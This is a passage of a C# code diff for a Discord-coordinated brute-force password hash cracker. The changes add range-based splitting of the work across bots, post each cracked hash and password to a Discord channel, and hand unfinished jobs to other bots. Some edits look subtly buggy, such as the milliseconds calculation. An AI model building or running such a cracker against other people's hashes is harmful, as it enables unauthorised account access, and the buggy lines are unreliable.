                 BigInteger minutes = remainingMinutes / 60;
                 BigInteger seconds = remainingMinutes % 60;
-                BigInteger milliseconds = (BigInteger)((estimatedTimeRemaining - Math.Floor(estimatedTimeRemaining)) * 1000);
+                BigInteger milliseconds = (estimatedTimeRemaining % 1000);
 
                 // Format the time
                 formattedTimeElapsed = $"{days:D3}D:{hours:D2}H:{minutes:D2}M:{seconds:D2}S:{milliseconds:D3}F";
@@ -1672,12 +2162,11 @@ namespace MultiCracker
                 status += $"Time started: **{timeStarted}** \r\n";
                 status += $"Time stopped: **{timeStopped}** (Estimated...)\r\n";
                 status += $"\r\n";
-                status += $"Hashes per second: **{hashesPerSecondInt}** \r\n";
+                status += $"Hashes per second: **{hashesPerSecondInt}** (Uses ForcesSS: {UsesForcesSS}, Accual count: {AccualCount}) \r\n";
                 status += $"Time elapsed: **{formattedTimeElapsed}** \r\n";
                 status += $"Estimated time remaining: **{formattedTimeRemaining}** \r\n";
                 status += $"\r\n**------------------ Misc ------------------**\r\n";
-                status += $"Force start: **{forceStart}** \r\n";
-                status += $"Force end: **{forceEnd}** \r\n";
+                status += $"ForcesSS: **{forcesSS}** \r\n";
             }
             catch (Exception ex)
             {
@@ -1833,12 +2322,17 @@ namespace MultiCracker
             }
 
             // Debug
-            txtOutput.AppendText("Attempt #" + counter + ": " + pass + "\r\n");
-            //txtOutput.AppendText("Hashed password: " + hash + "\r\n");
+            if (DebugMode)
+            {
+                txtOutput.AppendText("Attempt #" + counter + ": " + pass + "\r\n");
+                //txtOutput.AppendText("Hashed password: " + hash + "\r\n");
+            }
 
             txtGuessedPassword.Text = hash;
         }
 
+
+        // Cracking
         private async void btnStartCracking_Click(object sender, EventArgs e)
         {
             await Task.Run(() => StartCrackingAsync());
@@ -1887,17 +2381,59 @@ namespace MultiCracker
 
             foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
             {
-                if (EmergencySTOP || counter >= forceEnd)
+                if (EmergencySTOP)
                 {
                     break;
                 }
+
+                // Check if the counter is inside of a point, such as 0,100;500,600;800,1000
+                bool insideRange = false;
+                
+                // Convert forcesSS to forceRanges
+                List<(int, int)> forceRanges = new List<(int, int)>();
+                string[] forceRangesRaw = forcesSS.Split(";");
+                try
+                {
+                    foreach (var forceRangeRaw in forceRangesRaw)
+                    {
+                        string[] forceRange = forceRangeRaw.Split(",");
+                        forceRanges.Add((Convert.ToInt32(forceRange[0]), Convert.ToInt32(forceRange[1])));
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Its most likly a out of range exception therefor no need to log... this will happend every time the counter is not inside of a range.
+                    //Log(new LogMessage(LogSeverity.Error, "Cracking", $"Error converting forcesSS to forceRanges: {ex.Message}"));
+                }
+
+                try
+                {
+                    // Check if counter is inside of a range
+                    foreach (var forceRange in forceRanges)
+                    {
+                        int forceStart = forceRange.Item1;
+                        int forceEnd = forceRange.Item2;
+                        if (counter >= forceStart && counter <= forceEnd)
+                        {
+                            insideRange = true;
+                            break;
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Log error
+                    Log(new LogMessage(LogSeverity.Error, "Cracking", $"Error checking if counter is inside of a range: {ex.Message}"));
+                }
+
                 counter++;
-                if (counter < forceStart)
+                if (!insideRange)
                 {
                     continue;
                 }
 
                 PassToHash(password);
+                AccualCount++;
 
                 // Check if found password is the target password
                 if (txtGuessedPassword.Text == txtTargetHash.Text)
@@ -1954,7 +2490,7 @@ namespace MultiCracker
                         Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating time elapsed: {ex.Message}"));
                     }
 
-                    await channel.SendMessageAsync($"@everyone **Password found! It only took {formattedTimeElapsed} to find the password!**");
+                    await channel.SendMessageAsync($"@everyone **Password found! It only took {formattedTimeElapsed} to find the password!** (Used forcesSS: {forcesSS})");
                     await channel.SendMessageAsync($"{txtGuessedPassword.Text}:{finalPassword}");
 
                     // Activate function to send hash and password to discord channel "hash" in the same guild
@@ -1974,6 +2510,16 @@ namespace MultiCracker
             else
             {
                 await channel.SendMessageAsync($"@everyone Password NOT found! {txtGuessedPassword.Text}:{finalPassword}");
+
+                // Find channel "forces" in the same guild and look though all messages
+                var guild3 = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                var channel3 = guild3.TextChannels.FirstOrDefault(ch => ch.Name == $"forces");
+
+                // Send message to discord (<hash>:<algorithm>:<useNumbers>:<useLetters>:<useSymbols>:<useCapitals>:<Max>:<Min>:<combinations>:<forceStart>:<forceEnd>)
+                await channel3.SendMessageAsync($"{txtTargetHash.Text}:{Algorithm}:{UseNumbers}:{UseLetters}:{UseSymbols}:{UseCapitals}:{MaxLength}:{MinLength}:{globalCombinations}:{forcesSS}");
+
+                // Log that message was sent
+                Log(new LogMessage(LogSeverity.Info, "Cracking", $"Done with cracking and password was not found, therefor I sent a forces argument to all other bots."));
             }
             // If you want to use the target hash as the final password, you can do this:
             txtDonePassword.Text = finalPassword.ToString();
@@ -2002,6 +2548,7 @@ namespace MultiCracker
                 }
             }
         }
+
 
         private IEnumerable<string> GenerateCombinations(IEnumerable<char> chars, int length)
         {
@@ -2036,6 +2583,8 @@ namespace MultiCracker
                 combinations += BigInteger.Pow(totalCharacters, length);
             }
 
+            // Set the combinations
+            globalCombinations = combinations;
             return combinations;
         }
 
@@ -2258,7 +2807,7 @@ namespace MultiCracker
 
         private async void button2_Click(object sender, EventArgs e)
         {
-            SendHeartbeat();
+            SendHeartbeat(0);
         }
 
         private void btnElevate_Click(object sender, EventArgs e)
